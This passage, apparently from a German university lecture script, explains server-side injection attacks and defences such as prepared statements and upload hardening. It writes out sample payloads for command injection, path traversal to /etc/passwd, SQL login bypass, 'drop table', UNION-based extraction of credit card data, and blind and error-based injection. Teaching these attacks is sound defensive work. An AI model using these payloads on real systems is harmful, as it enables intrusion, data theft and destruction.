@@ -1,0 +1,512 @@
+\chapter{Serverseitige Angriffe}
+
+Ein Grundsatz der Programmierung ist \textit{Garbage-In, Garbage-Out}. In Anlehnung an FIFO (\textit{First-In, First-Out}) wird damit ausgedrückt, dass durch ``schlechte'' Benutzereingaben undefiniertes Verhalten produziert wird. Während dies ursprünglich funktional gedacht war, ist diese Aussage auch für die Sicherheit einer Applikation relevant.
+
+Benutzern kann nicht getraut werden. Während gutartige Benutzer bestenfalls wirre Eingaben erstellen, werden durch bösartige Benutzer Eingaben durchgeführt, die gezielt die Sicherheit eines Systems kompromittieren sollten. Das Grundmuster ist, dass eine Eingabe im Daten-Kontext durchgeführt wird, also ein Programm Benutzerdaten erwartet. Durch Fehler werden allerdings diese Daten in einem Kommando-Kontext ausgeführt, aus den gedachten Daten werden also auf Programmebene Befehlsanforderungen. Dies wird durch Angreifer ausgenutzt um, von der Applikation ungewollte, Kommandos abzusetzen. Diese Kommandos werden dann mit den Rechten der Webapplikation (oder eines weiteren Hintergrundsystems) ausgeführt.
+
+Ein Problem ist die große Angriffsfläche da nicht nur die direkt Eingabe-verarbeitenden Stellen überprüft werden müssen, sondern alle Programmteile die potentiell Benutzereingaben indirekt erhalten können (z. B. Daten aus deiner Datenbank auslesen, die ursprünglich von einem Benutzer bereitgestellt wurden). Ebenso muss ein Ausbruch nicht direkt am angegriffenen System erfolgen, sondern kann auch auf Hintergrundsystemen passieren. Beispielsweise kann ein Angreifer eine Webapplikation angreifen, bricht aber erst auf Datenbankebene aus dem System aus (auf einem getrennten Datenkbankserver).
+
+Da Tests auf Injection-Angriffe meist gegen bestimmte Operationen und bestimmte Hintergrundsysteme gerichtet sind (z. B. gegen eine MSSQL Datenbank) werden zumeist Dutzende oder Hunderte Angriffsmuster durchprobiert. Aus Effizienzgründen wird hier sehr stark auf automatisierte Tools gesetzt.
+
+Der Verteidigungsgrundsatz ist es, niemals Benutzerdaten zu vertrauen. Alle Benutzereingaben müssen auf Schadmuster hin überprüft werden, falls Schadcode entdeckt wird, muss die Eingabe verworfen oder gecleaned werden. Aufgrund der vielen verschiedenen Angriffsmuster ist dies nur mittels Bibliotheken sinnvoll möglich. Benutzereingaben dürfen niemals direkt zur Erstellung dynamischer Operationen verwendet werden. Die meisten Frameworks bieten dezidierte Möglichkeiten um Benutzereingaben in Operationen zu inkludieren (z. B. \textit{prepared statements}), bei diesen wird automatisch eine Filterung von Schadcode durchgeführt. Und schlussendlich sollten alle Benutzerausgaben noch sanitized bzw. maskiert werden bevor sie wieder angezeigt werden. Dadurch wird verhindert, dass Operationen im Kontext eines anderen Benutzers ausgeführt werden.
+
+Als zusätzliche Hardening-Maßnahme können Sandboxing-Konzepte, optionale HTTP Security-Header und IDS/IPS-Systeme verwendet werden.
+
+\section{File Uploads}
+
+Wenn ein Benutzer bei einer Webseite Dateien hochladen und der idente Benutzer (oder ein anderer Benutzer) danach wieder auf diese Dateien zugreifen kann, ergeben sich zwei Gefährdungsmomente. Einerseits kann der idente Benutzer versuchen, mit dem hochgeladenen File den Server direkt anzugreifen (z. B. um Code am Server auszuführen), auf der anderen Seite kann ein Angreifer versuchen, auf diese Weise einen anderen Benutzer anzugreifen (z. B. um dessen Session zu übernehmen).
+
+\subsection{Das Upload-Verzeichnis}
+
+In einer sicherheitstechnisch guten Webapplikation sind alle Dateien und Verzeichnisse schreibgeschützt --- Angriffe, die serverseitig Dateien erstellen oder modifizieren müssen, werden dadurch erschwert. Die einzige Ausnahme sollte das Upload-Verzeichnis sein in welches die Webapplikation (bzw. der Systemuser der Webapplikation) schreibend zugreifen darf.
+
+Dieses Verzeichnis sollte niemals unterhalb des Webroots liegen, falls z. B. der Webroot \url{/var/www/html} ist, sollte das Uploadsvereichnis sich nicht unter \url{/var/www/html/uploads} befinden. Würde das Verzeichnis so situiert sein, kann der Webserver bei einem Zugriff auf ein hochgeladenes File schwer unterscheiden, ob eine hochgeladene Datei zum ``normalen'' Umfang der Webapplikation gehört, oder ob es sich um eingeschleusten Schadcode handelt. Zusätzlich sollten Directory-Listings für dieses Verzeichnis deaktiviert werden und das Verzeichnis auf einer Partition mit aktivierter \textit{noexec} Mount-Option (bei Verwendung von Linux) platziert werden.
+
+Der Dateiname, unter dem ein hochgeladenes File abgelegt wird, sollte niemals durch den User bestimmt werden. Dies würde path traversal Angriffe erlauben\footnote{Diese werden im Kapitel Injection Attacks erklärt.} bzw. könnte ein Angreifer den bekannten Pfad zu einem File im Zuge von weiteren Injection-Angriffen verwenden.
+
+Ein architekturelles Problem ist durch die Struktur von Webapplikationen bedingt. Eine deployte Webapplikation besteht meistens aus einem Webserver und einem Applikationsserver. Ersterer ist für die Zustellung statischer Dateien optimiert, letzterer beinhaltet die Applikationslogik inkl. der Zugriffskontrollen. Werden Dateien direkt über ein Upload-Verzeichnis bereitgestellt, übernimmt diese Aufgabe der Webserver (der für diese statische Zustellung optimiert ist) und nicht der Applikationsserver --- in diesem Fall kann es passieren, dass die Authentication und Authorization nicht überprüft wird. Um dies zu vermeiden, sollte ein Download immer mittels einer dezidierten Downloadoperation, z. B. mittels \url{https://example.local/download?file_id=xxx}, durchgeführt, und auf diese Weise durch den Applikationsserver ausgeführt werden. Dabei sollten serverseitig die benötigten Zugriffsrechte überprüft werden, als Id wird die Verwendung einer zufälligen ID wie z. B. einer UUID empfohlen.
+
+\subsection{Upload von Malicious Files}
+
+Ein einfacher Angriff ist der der Upload von Dateien, die Code zur serverseitigen Ausführung beinhalten --- z. B. das Hochladen von einer \textit{.php} Datei bei Verwendung einer PHP Webapplikation. Der Angreifer würde nach dem Upload auf die Datei zugreifen und dadurch den Code am Server zur Ausführung bringen. Bei einem File-Upload sollten daher die möglichen Dateitypen durch eine Whitelist auf Dateitypen, die nicht am Server exekutiert werden, beschränkt werden. Ebenso sollte mittels dem \textit{Content Disposition} HTTP Header dem Browser mitgeteilt werden, dass eine bezogene Datei explizit heruntergeladen sollte (und nicht als Teil der Webapplikation ausgeführt werden sollte).
+
+Eine weitere Empfehlung ist die Verwendung eines server-seitigen Virenscanners. Diese arbeiten zumeist auf Dateisystem-Basis --- wird ein File mit bösartigem Code hochgeladen, wird dieses gescannt und gegebenenfalls unter Quarantäne gestellt bzw. gelöscht. Da die Webapplikation dies nicht automatisch bemerkt, kann es dabei zu Inkonsistenzen zwischen dem Dateisystem und verlinkten Dateien in der Webapplikation kommen. Eine saubere, aber aufwendige, Lösung wäre die Integration des Virenscanners in den Upload-Prozess der Webapplikation (z. B. über ein API des Virenscanners). Ein workaround wäre es, falls der Virenscanner beim Löschen einer Datei eine gleichnamige Datei mit einem Löschhinweis hinterlegt. Auf diese Werden werden die toten Dateilinks innerhalb der Applikation vermieden.
+
+Besondere Beachtung sollte der Upload von gepackten Dateien (\textit{zip}, \textit{rar}) erhalten. Hier muss auf der einen Seite beachtet werden, dass Archive entpackt und der Inhalt des Archivs ebenso analysiert wird, auf der anderen Seite muss darauf geachtet werden, dass während des Entpackvorgangs kein Sicherheitsfehler passiert.
+
+Ein Spezialfall des Uploads von malicious Dateien ist der Upload von Dateien, die bösartiten JavaScript-Code beinhalten. Da diese Angriffe gegen andere Clients (zumeist Webbrowser) abzielen, werden diese im Kapitel \textit{Client-seitige Injection Angriffe} (Kapitel \ref{upload_js}) behandelt.
+
+\subsection{Sandboxing}
+
+Falls eine Webapplikation nicht-vertrauenswürde Dateien verarbeiten muss, muss diese Dateien aus nicht-vertrauenswürdigen Quellen (Benutzer) analysieren. Dies ist eine notorisch gefährliche Operation und wird selten vollkommen sicher implementiert werden können. Um das potentielle Schadmass zu reduzieren kann Sandboxing verwendet werden. Dabei wird der Parse-Code in einem abgeschotteten Bereich des Systems ausgeführt, im Falle eines erfolgreichen Angriffs wird zumindest nicht das Gesamtsystem kompromittiert.
+
+Techniken in diesem Umfeld beinhalten chroots, Jails, Container und Microservice-Architekturen.
+
+\section{Command Injection}
+
+Eine Command Injection zielt darauf ab, Binaries (Kommandozeilentools) auf dem Zielserver auszuführen, zumeist wird dies über modifizierte HTTP Operationsparameter erzielt. Beliebtes Ziel ist das Erstellen einer shell oder reverse-shell: dies erlaubt es Angreifern, ähnlich wie mittels SSH, mit den Rechten der Webapplikation Befehle am Server auszuführen.
+
+Im Zuge einer Command Injection wird ein Programm am Server ausgeführt. Da die meisten Webapplikationen losgelöst vom zugrunde liegenden System (z. B. Windows oder Linux) entwickelt werden, rufen diese selten direkt Systemkommandos auf. Eine Ausnahme sind embedded Systeme bei denen die Hardware zusammen mit der Software gebündelt geliefert wird. Gerade im Router-/AccessPoint-Umfeld werden gerne direkt Systemkommandos über die Weboberfläche aufgerufen. Dementsprechend ist das klassische Command Injection Beispiel eine typische Weboperation die von Access Points bereitgestellt wird: mittels des \textit{ping} Kommandos soll die Netzwerkkonnektivität zwischen dem Access Point und einem externen Server überprüft werden.
+
+Dies könnte mit folgendem Pseudo-Python Code implementiert werden:
+
+\begin{minted}{python}
+import os
+domain = user_input()
+os.system('ping ' + domain)
+\end{minted}
+
+In der Variable \textit{domain} wird eine Benutzereingabe gespeichert, es wird angenommen, dass diese ein domainname ist. Ein Angreifer könnte nun z. B. \textit{localhost; ls} als Eingabe verwenden. Durch den übergebenen ; wird bei Unix-Kommandos ein Kommando beendet und das nächste begonnen. Durch diese Verkettung versucht also der Angreifer das Kommando \textit{ls} einzuschleusen.
+
+Ähnliche Muster sind:
+
+\begin{itemize}
+\item ;ls
+\item \$(ls)
+\item `ls`
+\end{itemize}
+
+Ein ähnliches Verhalten kann ausgenutzt werden, wenn der Verdacht besteht, dass Dateien mittels Systembefehlen ausgegeben werden und die auszugebende Datei über HTTP Parameter übermittelt wird.
+
+Beispiele hierfür:
+
+\begin{itemize}
+\item \url{http://sensitive/cgi-bin/userData.pl?doc=/bin/ls|}
+\item \url{http://sensitive/something.php?dir=\%3Bcat\%20/etc/passwd}
+\end{itemize}
+
+Um Command Injection Probleme zu umgehen wird empfohlen, Programmierbibliotheken anstatt von Kommandozeilenaufrufen zu verwenden. Da hierbei nun keine getrennte Shell geöffnet wird, kann an dieser Stelle auch kein Kommando eingefügt werden.
+
+\section{Path Traversals}
+
+Bei einem Path Traversal wird versucht, über modifizierte Parameter auf Ressourcen außerhalb des Webroots einer Webapplikation zuzugreifen. Auf diese Weise kann versucht werden, auf applikations-externe Ressourcen lesend oder schreibend zuzugreifen bzw. kann versucht werden, ausführbare Dateien am Server zu starten.
+
+Ein Beispiel für eine potentiell angreifbare Operation wäre \url{https://opfer.local/GetImage.jsp?file=diagram.jpg}. Ein Angreifer könnte versuchen, über den Wert \textit{./../../../../etc/passwd} für den Parameter \textit{file} auf eine Datei außerhalb des Webroots zuzugreifen.
+
+Als Gegenmaßnahme sollte primär versucht werden, nicht Dateinamen als benutzer-gesteuerten Parameter zu verwenden. Falls dies wirklich notwendig ist, sollten die Dateinamen gegen eine rigorose Whitelist und auf invalide Steuersignale hin (z. B. NULL-Characters und Zeilenumbrüche) überprüft werden und vor dem Zugriff auf Ressourcen der kanonische Pfad gebildet und verifiziert werden.
+
+Eine weitere Sicherheitsmaßnahme wäre der Einsatz von Sandboxing-Techniken wie eines \textit{chroot}. Durch Anwendung des Separation of Privileges Prinzips wird das Schadmass verkleinert: der Webserver sollte nur auf Dateien zugreifen können die für den Webserver relevant sind. Weitere Dateien (wie z. B. Systemdateien) sollten weder lesend noch schreibend zugreifbar sein.
+
+\section{Datenbank-Injections}
+
+Datenbank-Injections gehören zu den selteneren, dafür aber schwerwiegenderen, vorkommenden Sicherheitsfehlern. Das Grundproblem ist, dass Datenbankabfragen unter Zuhilfename von Benutzereingaben gebaut werden. Durch bösartige Benutzereingaben versuchen Angreifer nun, das Datenbanksystem zur Freigabe zusätzlicher Daten zu bringen, unbeabsichtigt Daten zu verändern oder sogar aus dem Datenbanksystem auf das Betriebssystem auszubrechen.
+
+\subsection{SQL}
+
+SQL (Structured Query Language) ist die bekannteste Abfragesprache für relationale Datenbanken. Im Zuge dieser Vorlesung werden nur einfache SQL-Features benötigt. Ein Beispiel für ein einfaches SQL Statement:
+
+\begin{minted}{sql}
+select column1, column2 from table1, table2
+where column1 = ‘xyz’
+order by column1 asc/desc
+limit 1;
+\end{minted}
+
+In diesem Fall werden zwei Spalten \textit{column1} und \textit{column2} aus zwei Tabellen \textit{table1} und \textit{table2} ausgelesen. Mittels der where-Klausel wird eine Bedingung zur Filterung der Daten hinzugefügt, mittels \textit{order by} die Daten entweder aufsteigend oder absteigend sortiert und mittels \textit{limit} die Anzahl der Datensätze auf einen Datensatz limitiert.
+
+SQL bietet die Möglichkeit die Ausgaben zweier Queries zu einer Gesamtausgabe zu kombinieren. Hierfür wird das \textit{UNION} Kommando verwendet:
+
+\begin{minted}{sql}
+select column1, column2 from table1, table2
+union all
+select column3, column4 from table4, table5;
+\end{minted}
+
+Dies ist nur möglich, wenn beide verwendeten SQL-Queries die idente Anzahl von Spalten zurück liefern.
+
+\subsection{Arten von SQL-Injections}
+
+Die einfachste Form der SQL-Injection basiert darauf, dass die Applikation eine einfache String-Concatenation zur Erstellung des SQL-Ausdrucks verwendet. Der Angreifer versucht nun einen Wert zu übergeben der, wenn er in den SQL-String eingesetzt wird, zuerst den bestehenden SQL-Ausdruck beendet/schließt und danach zusätzlich Code ausführt.
+
+Als Beispiel wird hier ein Login verwendet, der über folgende HTTP Operation durchgeführt wird: \url{https://kino.local/login.php?email=ah@coretec&password=pw}. Der Angreifer vermutet, dass die Überprüfung des Logins über eine Datenbank-Abfrage ausgeführt wird, die z. B. in Java als String erstellt wird:
+
+\begin{minted}{java}
+String query = "select * from users where email = '" +email+ "' and password = '" +password +"' limit 1;";
+\end{minted}
+
+Die Email-Adresse und das Passwort wird als Teil der Datenbank-Abfrage verwendet, wird ein Datensatz zurückgegeben wird der erste Datensatz vermutlich zur Befüllung der Benutzersession verwendet. Wird kein Datensatz zurückgegeben nimmt die Applikation an, dass der Login nicht erfolgreich war.
+
+Ein Angreifer würde nun z. B. folgendes Fragment als Passwort übergeben:
+
+\begin{minted}{text}
+1' or '1'='1
+\end{minted}
+
+Durch diesen Ausdruck würde folgendes SQL-Kommando entstehen:
+
+\begin{minted}{java}
+String query = "select * from users where email = 'ah@coretec.at' and password = '1' or '1'='1' limit 1;";
+\end{minted}
+
+Anstatt dass die Email-Adresse und das Passwort überprüft werden, wird nun initial die Email und das Passwort überprüft. Dabei wird wahrscheinlich als Ergebnis \textit{false} erzeugt, damit würde prinzipiell kein Datensatz zurückgegeben werden. Der Angreifer schafft es allerdings, auch den Ausdruck \textit{1=1} hinzuzufügen. Dieser ergibt immer \textit{true}, durch die Oder-Verknüpfung wird der Gesamtausdruck \textit{true} und liefert daher alle Zeilen der Tabelle als Resultat. Der Applikationscode würde nun die erste Zeile extrahieren und mit diesem Datensatz die Session befüllen. Der Angreifer hat auf diese Weise das Login-System überlistet und die Identität eines anderen Benutzers angenommen.
+
+\subsubsection{Stacked Queries}
+
+Die grundsätzliche Methode an eine bestehende SQL-Abfrage zusätzliche (ungewollte) Queries anzuhängen und dadurch Code auszuführen wird Stacked Query genannt. Das klassische Beispiel für eine solche ist:
+
+\begin{minted}{text}
+'; drop table users; --
+\end{minted}
+
+Mittels des ersten Zeichens \textit{'} wird versucht aus dem vorgesehenen SQL-Ausdruck auszubrechen. Das Semikolon dient zum Beenden des eigentlichen Kommandos und der Angreifer kann ein beliebiges SQL-Kommando anhängen --- in diesem Fall ein \textit{drop table} Kommando, welches eine Datenbank löschen würde. Zum Schluss wird mit einem weiteren Semikolon der eingeschleuste Befehlt beendet und durch die beiden Bindestriche ein Kommentar eingeleitet. Auf diese Weise wird potentiell nachfolgender SQL-Code auskommentiert.
+
+\subsubsection{UNION-based SQL-Injection}
+
+Bei UNION-basierten SQL-Angriffen wird versucht mittels des \textit{UNION} Kommandos ein zusätzliches \textit{SELECT} Statement an ein bestehendes Select-Statement anzuhängen. Häufig wird dies verwendet, wenn eine Web-Applikation eine Tabellen-ähnliche Datenauflistung bietet.
+
+Beispiel: eine Webapplikation stellt in Tabellenform in der Oberfläche eine Liste von Personen dar. Ein Benutzer kann diese Liste durch Eingabe einer ID einschränken. Es wird daher angenommen, dass die Daten der dargestellten HTML-Tabelle durch eine SQL-Abfrage der Form:
+
+\begin{minted}{sql}
+SELECT Name, Phone, Address FROM Users WHERE Id=$id
+\end{minted}
+
+bereitgestellt wird. Der Parameter \textit{\$id} wird durch den Benutzer bereitgestellt. Ein Angreifer kann nun versuchen, hier eine SQL-Injection durchzuführen. Beispielsweise könnte dafür folgendes Fragment verwendet werden:
+
+\begin{minted}{sql}
+1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable
+\end{minted}
+
+Dieses Fragment wird durch die Webapplikation für \textit{\$id} eingesetzt (da ID in diesem Fall ein Zahlenwert ist, muss, verglichen mit dem Ausbruch aus einem String-Wert, werden hier keine Quoting-Zeichen wie ' benötigt) und erzeugt auf diese Weise die folgende SQL-Abfrage:
+
+\begin{minted}{sql}
+SELECT Name, Phone, Address FROM Users WHERE Id=1
+UNION ALL
+SELECT creditCardNumber,1,1 FROM CreditCardTable
+\end{minted}
+
+Die Tabelle wird nun initial mit den Daten des Users mit der Id 1 befüllt, zusätzlich werden alle Kreditkartennummern der Tabelle CreditCardTable angehängt (bei diesen Daten werden Spalten 2 und 3 mit der Konstanten 1 gefüllt).
+
+Da bei einem UNION-Select die Spaltenanzahl der jeweiligen Queries ident sein muss, muss der Angreifer initial die richtige Spaltenanzahl erraten. Dies wird zumeist über Brute-Force Angriffe durchgeführt.
+
+\subsubsection{Boolean-based Blind SQL Injection}
+
+Eine SQL-Injection ist auch ohne direkten Antwortkanal möglich. Ein Beispiel hierfür sind Boolean-based blind SQL-Injections.
+
+Ein Beispiel: gegeben eine Produktseite \url{opfer.local/product/1} die ein Produkt anzeigt. Der Angreifer hat bereits erkannt, dass bei Eingabe von \url{opfer.local/product/1 and 1=1} die Produktseite ebenso angezeigt wird und bei \url{opfer.local/product/1 and 1=0} kein Produkt gefunden wird. Dadurch besteht die Annahme, dass der Angreifer einen Ausdruck and die Produkt-Id (1) anhängen kann und dass dieser Ausdruck auch exekutiert wird (der Ausdruck 1=0 ergibt immer \textit{false}, durch die Und-Verknüpfung mit \textit{false} wird kein Produkt mehr geliefert). Dies kann nun ausgenutzt werden, um mit einzelnen Abfragen den Datenbankinhalt auszulesen. Beispielsweise kann der Angreifer folgenden Ausdruck bilden:
+
+\begin{minted}{sql}
+SELECT field1, field2, field3 FROM Users WHERE Id='1' AND ASCII(SUBSTRING(username,1,1))=97
+\end{minted}
+
+An die eigentlichen Suchausdruck wird also eine Substring-Abfrage hinzugefügt. Diese extrahiert die erste Stelle des Benutzernamens, verwandelt diese über die \textit{ASCII}-Funktion in einen ASCII-Wert und überprüft, ob die erste Stelle des Benutzernamens ein A ist. Wird nun die Produktseite des Produkts 1 zurückgeliefert, weiß der Angreifer, dass das erste Zeichen des Benutzernamens ein A ist. Wird keine Produktseite geliefert, würde der Angreifer versuchen ob der ASCII Wert dem Zeichen B entspricht. Durch mehrere (tausende) Anfragen kann der Angreifer auf diese Weise die gesamte Datenbank rekonstruieren.
+
+\subsubsection{Time-based Blind SQL Injection}
+
+Ähnlich wie bei einer boolean based blind SQL-Injection gibt es bei dieser Angriffsart keinen direkten Antwortkanal für die extrahierten Informationen. Anstatt wird ein side-channel Angriff auf das Zeitverhalten der Antwort angewandt.
+
+Der Angreifer besitzt die Möglichkeit ein SQL-Fragment an eine Anfrage anzuhängen und zur Exekution zu bringen. Wieder wird eine IF-Abfrage verwendet, in dem konkreten Fall wird, falls die Abfrage erfolgreich ist, die Antwort um 10 Sekunden verzögert:
+
+\url{http://www.examplecom/product.php?id=10 AND IF(ASCII(SUBSTRING(username,1,1))=97, sleep(10), ‘false’))--}
+
+Als Abfrage wird der idente ``fängt der Benutzername mit A an?'' verwendet. Falls dies war sein sollte wird mittels \textit{sleep(10)} die Antwort verzögert, wenn nicht wird sofort geantwortet. Mittels vieler Abfragen kann der Angreifer auf diese Weise die gesamte Datenbank extrahieren.
+
+Im Zuge eines Time-Based Angriffs wird mehr oder weniger ein Model der Antwortzeiten aufgebaut. Da normalerweise die eingefügte Verzögerung minimiert wird (um möglichst schnell Daten extrahieren zu können) ist diese Angriffsart fehlerbehaftet und verwundbar gegenüber Netzwerk-Jitter. Falls die Netzwerkverbindung selbst instabil ist (also Anfragen aufgrund des Netzwerks unterschiedlich lange benötigen), können einzelne Zeichen invalid erkannt werden.
+
+\subsubsection{Error-based Injections}
+
+Bei \textit{Error-based Injections} wird absichtlich ein Fehler eingebaut um über den ausgegebenen Fehlertext Informationen zu extrahieren.
+
+Ein Beispiel in MySQL: es gibt in Mysql die mathematische Funktion \textit{exp} welche ab einem übergebenen Dezimalwert von ca. 260 einen Fehler ausgibt. Ebenso gibt es den Operator \char`\~ welcher ein Bitweises Kompliment bildet. Wird dieser Operator auf das Ergebnis eines Selects angewandt, ist das Ergebnis eine sehr große Zahl.
+
+Ein Angreifer kann dieses Verhalten für eine Datenextraktion nutzen, z. B.:
+
+\begin{minted}{text}
+exp(~(select * from (select user()) x)
+\end{minted}
+
+Es wird also in einem sub-select die Funktion \textit{user()} aufgerufen, die den aktuellen Benutzernamen zurück gibt. Auf dieses Ergebnis wird ein bitweises Kompliment angewandt, es wird eine große Zahl erzeugt; diese Zahl wird dann an die \textit{exp}-Funktion übergeben und wird einen Fehler werfen.
+
+Die generierte Fehlermeldung:
+
+\begin{minted}{text}
+mysql>select exp(~(select * from (select user()) x ));
+ERROR 1690(22003): DOUBLE value is out of range in'exp(~((select 'root@localhost' from dual)))'
+\end{minted}
+
+In der Fehlermeldung wurde allerdings der innere SQL-Ausdruck exekutiert, dadurch wird der Benutzername \textit{root@localhost} ausgegeben und eine Datenextraktion ist erfolgt.
+
+Dies ist ein weiterer Grund, warum auf einer Webseite keine detaillierten Fehlermeldungen ausgegeben werden sollten.
+
+\subsubsection{Ausbruch aus dem Datenbanksystem}
+
+Eine weitere Möglichkeit des Angreifers ist es aus dem Datenbanksystem auf das Dateisystem auszubrechen. Dadurch kann er mit den Rechten des Datenbankbenutzers entweder auf Dateien am Datenbankserver zugreifen oder besitzt dadurch sogar Shell-Access auf das System. Dies ist einer der Gründe, warum Datenbanksysteme immer mit einem eigenen Benutzer laufen sollten.
+
+Ein bekanntes Beispiel für dieses Problem ist die Funktion \textit{xp\_cmdshell} bei Microsoft SQL-Server welche die Ausführung von Programmen über SQL erlaubt. Mittlerweile ist diese Funktion aus Sicherheitsgründen deaktiviert, bei älteren Microsoft SQL-Server Versionen kann allerdings diese Funktion mittels einer SQL-Injection ebenso aktiviert werden.
+
+Ein Beispiel aus dem Open-Source Umfeld wäre PostgreSQL, welches es Datenbankadmins erlaubt, neue Tabellen zu erstellen und diese mit Daten aus dem Dateisystem zu befüllen:
+
+\begin{minted}{sql}
+postgres-# CREATE TABLE temp(t TEXT);
+postgres-# COPY temp FROM '/etc/passwd';
+postgres-# SELECT * FROM temp limit 1 offset 0;
+\end{minted}
+
+MySQL bietet auch die beiden Zusätze \textit{into outfile} bzw. \textit{into dumpfile} an. Damit wird das Resultat einer SQL-Query in eine Datei gespeichert. Falls der Datenbankserver mit einer hohen Berechtigunggstufe läuft (z. B. als \textit{root} oder \textit{www-data} Benutzer) kann dies verwendet werden um Dateien im Filesystem (z. B. im Web-Root) abzulegen und auf diese Weise eine Webshell hochzuladen (diese würde dann durch den Angreifer über den Webserver geöffnet werden).
+
+\subsection{Gegenmaßnahmen}
+
+Da das Grundproblem von SQL-Injections die Erstellung von dynamischen SQL-Kommandos basierend auf bösartigen Benutzereingaben ist, wäre das Escapen der Eingabe die erste mögliche Gegenmaßnahme. Dabei werden die Benutzereingaben so maskiert, dass sie gefahrenlos per String-Concatenation verwendet werden können. Da diese Lösung fehleranfällig und Datenbank-spezifisch ist, sollte sie so weit wie möglich vermieden werden.
+
+Ein besserer Lösungsansatz für SQL-Injection ist die Verwendung von \textit{prepared statements}. Bei diesen wird eine SQL-Abfrage mittels einer API gebaut (und mit Daten befüllt) anstatt ``nur'' Strings zu verknüpfen. Aufgrund der zusätzlich bereitgestellten Information ist die Datenbankbibliothek in der Lage, die benutzer-bereitgestellten Daten in einer Form einzusetzen, welche SQL-Injections verhindert.
+
+Ein Beispiel in Java:
+
+\begin{minted}{Java}
+String custname = request.getParameter("customerName");
+String query = "SELECT account_balance FROM user_data WHERE user_name = ?";
+
+PreparedStatement pstmt = connection.prepareStatement(query);
+pstmt.setString(1, custname);
+
+ResultSet results = pstmt.executeQuery();
+\end{minted}
+
+Die dynamische SQL-Query befindet sich im String \textit{query} und beinhaltet einen dynamischen Parameter der mit einem \textit{?} markiert wird. Durch die Methode \textit{setString} wird nun der 1te Parameter auf den Wert der Variable \textit{custname} gesetzt und auf diese Weise die Benutzereingabe in einer sicheren Art und Weise in die SQL-Query eingebaut.
+
+Ein weiteres Beispiel in PHP unter Verwendung von PDOs:
+
+\begin{minted}{php}
+$id = 1;
+$sth = $DBH->prepare("SELECT * FROM juegos WHERE id = :id");
+$sth->bindParam(':id', $id, PDO::PARAM_INT);
+$STH->execute();
+\end{minted}
+
+Bei diesem Beispiel werden die dynamisch inkludierten Daten mittels eines Platzhalters (\textit{:id}) identifiziert und mittels der Methode \textit{bindParam} gesetzt. Diese Art der Zuweisung hat den Vorteil, dass \textit{:id} innerhalb der Query an mehreren Stellen gesetzt werden kann. Ebenso wird durch das Hinzufügen eines weiteren dynamischen Parameters die Position der dynamischen Parameter nicht verändert\footnote{Würde man die \textit{?}-basierte Methode verwenden, muss man bei jeder Änderung des Query-Strings überprüfen, ob die Reihenfolge der dynamischen Parameter ident geblieben ist.}.
+
+Ein Problem mit prepared statements ist, dass nicht alle Elemente einer SQL-Abfrage auf diese Weise dynamisch befüllt werden können. Häufige Ausnahmen sind:
+
+\begin{itemize}
+	\item Tabellennamen
+	\item Spaltennamen
+	\item die Sortierrichtung (\textit{ASC}, \textit{DESC})
+\end{itemize}
+
+Falls diese Felder befüllt werden müssen, wird empfohlen die Applikationslogik so zu bauen, dass über die Eingabe erkannt wird, welches Feld gewählt wurde und basierend darauf ein statischer String zum Bauen der Query verwendet werden. Auf diese Weise wird vermieden, dass eine Benutzereingabe direkt in den Query-String eingebaut wird. Ebenso sollte bei einer solchen Konstruktion sowohl eine rigide Whitelist als auch Escaping verwendet werden.
+
+Ein Vorteil von Prepared Statements ist, dass die Absicherungslogik Teil der Applikationslogik ist. Andere Methoden (wie z. B. Stored Procedures) verschieben die Absicherung direkt in den Datenbankserver. Dabei besteht das Problem, dass z. B. Anwendungsentwickler annehmen könnten, dass gewisse Datenbank-Funktionen sicher implementiert wurden und Datenbank-Entwickler annehmen könnten, dass Daten bereits durch die Applikationsentwickler abgesichert wurden. Hierdurch kann es zu Diskrepanzen bei der Absicherung kommen.
+
+	Eine weitere Gegenmaßnahme sind \textit{Stored Procedures}. Dies sind Funktionen die im Datenbanksystem abgelegt und von der Applikation aufgerufen werden. Eine früher häufig genutzte Sprache zum Erstellen von Stored Procedures ist PL/SQL, mittlerweile können Stored Procedures auch in ``normalen'' Programmiersprachen entwickelt werden. Sie besitzen die gleichen Probleme wie applikatorische Abfragen: falls eine String-Verkettung verwendet wird, können SQL-Injections durchgeführt werden. Stored Procedures sind aber eher auf die Verwendung von Sprachmustern ausgelegt, die Injection-Angriffe vermeiden (ähnlich wie Prepared Statements) und da sie meistens von Datenbank-Spezialisten geschrieben werden, sind sie meistens sicher implementiert. Aus diesem Grund werden Stored Procedures häufig als Gegenmaßnahme zu SQL-Injections angeführt, auch wenn dies potentiell vom implementierenden Programmierer abhängig ist. Ein Nachteil von Stored Procedures ist, dass der Applikationscode dadurch auf den Applikationsserver und den Datenbankserver aufgeteilt wird und dadurch potentiell schwerer wartbar wird.
+
+\subsection{Object-Relational Mapping}
+
+Object-Relational Mapping (ORM) wird verwendet um basierend auf einer relationalen Datenbank eine virtuelle Objektdatenbank zu erstellen. Dabei wird eine ORM-Software verwendet, um aus Datenbank-Zeilen eine Repräsentation der Daten als Programmiersprachen-Objekt herzustellen. Datenabfragen und -veränderungsoperationen werden anschließend auf dieser Objekt-Repräsentation durchgeführt und intern als Datenbankbefehle ausgeführt.
+
+Ein häufiges Pattern in diesem Umfeld ist das ActiveRecord-Pattern. Bei diesem entspricht eine Datenbanktabelle einem Objekttypen und eine Zeile innerhalb der Datenbank wird zu einer Objectinstanz. Beispielsweise würde aus der Datenbanktabelle \textit{users} die Klasse \textit{User} gebildet werden. Eine Zeile der Datenbank würde zu einer Objektinstanz und z. B. die Spalte \textit{vorname} würde zum Feld \textit{vorname} des Objekts werden.
+
+Bei den meisten ORMs werden Abfragen innerhalb der Zielprogrammiersprache abgebildet, hier ein Beispiel in JavaScript unter Verwendung des ORMs \textit{sequalize}:
+
+\begin{minted}{javascript}
+models.Items.findAll({
+  limit: '1',
+  })
+\end{minted}
+
+In dem Beispiel wird ein Objekt des Typs Items erstellt. Problematisch bei ORMs ist, dass im Hintergrund zumeist SQL-Kommandos erstellt werden und daher SQL-Injections weiterhin möglich sind, hier ein Beispiel:
+
+\begin{minted}{javascript}
+models.Items.findAll({
+  limit: '1; DELETE FROM Items WHERE 1=1; --',
+})
+\end{minted}
+
+An den Limit-Parameter wird eine Stacked-Query angehängt und auf diese Weise eine SQL-Injection ausgeführt. Anhand diese Beispiels kann erkannt werden, das ORMs kein Allheilmittel für SQL-Injections sind.
+
+\subsection{NoSQL-Injections}
+
